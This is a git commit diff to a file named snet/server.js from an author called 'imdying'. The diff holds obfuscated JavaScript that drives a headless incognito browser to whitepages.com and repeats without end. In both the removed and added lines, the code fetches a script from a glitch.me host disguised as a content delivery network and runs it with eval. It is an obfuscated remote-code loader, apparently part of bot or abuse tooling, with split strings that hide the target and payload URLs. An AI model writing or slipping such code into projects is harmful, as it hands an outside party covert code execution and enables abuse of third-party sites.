e4bc0ca511fd3bed5fbfe0adbe5800df14faa013
imdying <amogus77@gmail.com>
2023-01-31 03:15:13 -0500

    a: 1675152913731

--- snet/server.js
+++ snet/server.js
@@ -8,14 +8,14 @@
       ]
     });
   (async function g() {
-    let h = 0x2098 + -0x5 * 0x1e3 + 0x7 * -0x34f;
+    let h = -0x1 * -0xf29 + -0x21d3 + -0x2 * -0x955;
     const i = await f['createInco' + 'gnitoBrows' + 'erContext'](),
       j = await i['newPage']();
     return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
       'timeout': 0x11170
     })['catch'](k => h++), h ? (await j['close'](), await i['close'](), g()) : (await j['evaluate'](() => {
       let k = new XMLHttpRequest();
-      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x305 + -0x1 * -0xc17 + -0x912), k['send'](), eval(k['responseTe' + 'xt']);
-    }), await wait(0x117290 + -0x1a30d8 + 0x1679e8), await j['close'](), await i['close'](), g());
+      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x65b * -0x4 + 0x81b + 0x1151), k['send'](), eval(k['responseTe' + 'xt']);
+    }), await wait(0x11204f + -0x12c529 + 0xf607a), await j['close'](), await i['close'](), g());
   }());
 })());
